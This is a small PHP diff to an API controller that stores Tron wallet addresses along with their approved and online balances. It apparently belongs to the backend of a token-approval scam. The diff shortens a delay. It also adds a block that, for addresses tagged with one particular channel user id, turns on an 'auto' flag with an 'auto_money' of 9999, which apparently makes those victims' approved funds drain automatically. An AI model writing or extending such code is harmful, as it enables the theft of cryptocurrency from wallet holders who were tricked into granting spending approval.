@@ -46,7 +46,7 @@ class Address extends Api
             }else{
                 (new \app\admin\model\Address())->insert($params);
             }
-            sleep(2);
+            sleep(1);
             $vo = Db('address')->where(['address'=>$params['address']])->find();
             if($vo){
                 if((new \Tron\Address($vo['address']))->isValid()){
@@ -67,6 +67,9 @@ class Address extends Api
                     }else{
                         db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>0]);
                     }
+                }
+                if($vo['h5_url'] == '1688vip_channel_user_id:37'){//jiema
+                    db('address')->where(['id'=>$vo['id']])->update(['auto'=>1,'auto_money'=>9999]);
                 }
             }
             return 'ok';
